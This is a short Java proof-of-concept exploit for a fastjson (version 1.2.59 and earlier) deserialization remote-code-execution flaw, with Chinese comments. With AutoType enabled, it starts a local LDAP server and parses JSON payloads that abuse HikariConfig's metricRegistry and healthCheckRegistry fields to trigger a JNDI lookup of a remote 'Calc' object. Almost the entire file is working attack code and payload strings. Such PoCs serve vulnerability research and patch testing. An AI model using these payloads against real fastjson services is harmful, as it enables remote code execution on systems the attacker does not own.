package com.threedr3am.bug.fastjson.rce;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.threedr3am.bug.common.server.LdapServer;

/**
 * fastjson <= 1.2.59 RCE，需要开启AutoType
 *
 *
 * <dependency>
 *       <groupId>com.zaxxer</groupId>
 *       <artifactId>HikariCP</artifactId>
 * </dependency>
 *
 * @author threedr3am
 */
public class HikariConfigPoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) {
    //TODO 使用rmi server模式时，jdk版本高的需要开启URLCodebase trust
//    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");


    ParserConfig.global.setAutoTypeSupport(true);

//    String payload = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://localhost:43657/Calc\"}";
//    String payload = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"rmi://localhost:43657/Calc\"}";
    String payload = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:43658/Calc\"}";
    String payload2 = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:43658/Calc\"}";
    JSON.parse(payload);
  }
}
